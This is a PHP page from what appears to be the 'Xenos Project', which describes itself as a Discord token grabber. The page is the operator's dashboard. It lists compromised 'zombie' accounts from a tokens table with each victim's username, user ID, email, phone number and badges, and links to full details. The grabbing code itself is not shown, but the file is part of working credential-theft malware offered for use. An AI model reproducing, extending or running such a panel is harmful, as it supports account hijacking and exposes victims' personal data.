<?php

    require_once('Inc/fonctions.php');

    if(!CheckLogin()){
        header('Location: login');
    }

?>

<!DOCTYPE html>
<html lang="en">
<head>

    <!-- Icon -->
    <link rel="shortcut icon" type="image/jpg" href="assets/images/logo.jpg"/>
    
    <!-- Reset Meta Tags -->
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Title -->
    <title>Xenos Project - Tokens</title>

    <!-- Css -->
    <link rel="stylesheet" href="assets/css/style.css">

    <!-- Javascript -->
    <script src="assets/js/d3.v3.min.js" charset="utf-8"></script>
</head>
<body>

    <!-- Navigation Bar -->
    <header>
        <nav>
            <a target="_blank" href="https://github.com/KanekiWeb" class="header_logo">
                <span>Xenos</span>
            </a>
            <div class="header_links">
                <ul class="nav_links">
                    <li class="nav_link"><a href="index">Acceuil</a></li>
                    <li class="nav_link"><a href="#">Tokens</a></li>
                </ul>
            </div>
        </nav>
    </header>

    <!-- Main -->
    <section class="section_main">
        <div class="main">
            <img src="assets/images/xenos.gif" alt="">
            <h1>Xenos Project</h1>
            <p>The Best Most powerfull token grabber with user interface.</p>
        </div>
    </section>

    <section class="section_zombies">
        <!-- <div class="filtre">
            <select onchange="SearchByGrade(this)" id="searcg_by_badges" name="searcg_by_badges" class="select-button">
                <option value="all">Grades: All</option>
                <option value="balance">Grades: Balance</option>
                <option value="bravery">Grades: Bravery</option>
                <option value="brilliance">Grades: Brillance</option>
                <option value="bughunter">Grades: BugHunter</option>
                <option value="dev">Grades: Dev</option>
                <option value="early">Grades: Early</option>
                <option value="hypesquad">Grades: HypeSquad</option>
                <option value="partner">Grades: Partner</option>
                <option value="staff">Grades: Staff</option>
                <option value="verified">Grades: Verified</option>
                <option value="nitroboost">Grades: Nitro Boost</option>
                <option value="nitrocl">Grades: Nitro Classic</option>
            </select>
            <input type="text" placeholder="Search Username..." class="select-input" onkeyup="SearchByUsername(this)"> -->
            <!-- <button class="select-button" onclick="CheckTokens()">Check All Tokens</button> -->
        <!-- </div> -->
        <div id="zombies" class="zombies">
            <?php
                global $bdd;

                $resp = $bdd->query('SELECT * FROM tokens');
                
                while ($user = $resp->fetch()) {
            ?>
                <div class="zombie">
                    <img class="user_pfp" src="https://cdn.discordapp.com/avatars/<?=$user['user_id']?>/<?=$user['avatar']?>" alt="" srcset="">
                    <span><?=$user['username']?> (<?=$user['user_id']?>)</span>
                    <p><?=$user['email']?></p>
                    <p><?=$user['phone']?></p>
                    <div class="badges">
                        <?php
                            if($user['badges'] == 1) {
                                echo '<img src="assets/badges/Staff.png" alt="" srcset="">';
                            }else if($user['badges'] == 2) {
                                echo '<img src="assets/badges/Partner.png" alt="" srcset="">';
                            }else if($user['badges'] == 4) {
                                echo '<img src="assets/badges/hypeSquad.png" alt="" srcset="">';
                            }else if($user['badges'] == 8) {
                                echo '<img src="assets/badges/BugHunter.png" alt="" srcset="">';
                            }else if($user['badges'] == 64) {
                                echo '<img src="assets/badges/Bravery.png" alt="" srcset="">';
                            }else if($user['badges'] == 128) {
                                echo '<img src="assets/badges/Brilliance.png" alt="" srcset="">';
                            }else if($user['badges'] == 256) {
                                echo '<img src="assets/badges/Balance.png" alt="" srcset="">';
                            }else if($user['badges'] == 512) {
                                echo '<img src="assets/badges/early.png" alt="" srcset="">';
                            }else if($user['badges'] == 131072) {
                                echo '<img src="assets/badges/dev.png" alt="" srcset="">';
                            }

                            if($user['nitro_badges'] == 1) {
                                echo '<img src="assets/badges/Nitro_cl.png" alt="" srcset="">';
                            }else if($user['nitro_badges'] == 2) {
                                echo '<img src="assets/badges/Nitro_cl.png" alt="" srcset="">';
                                echo '<img src="assets/badges/Nitro_Boost.png" alt="" srcset="">';
                            }
                        ?>
                    </div>
                    <a href="token?id=<?=$user['user_id']?>">View All Infos</a>
                </div>

            <?php
                }
            ?>
        </div>
    </section>

    <footer>
        Copyright ©️ Made By <a target="_blank" href="https://github.com/KanekiWeb">Kaneki Web</a>
    </footer>
    
</body>
</html>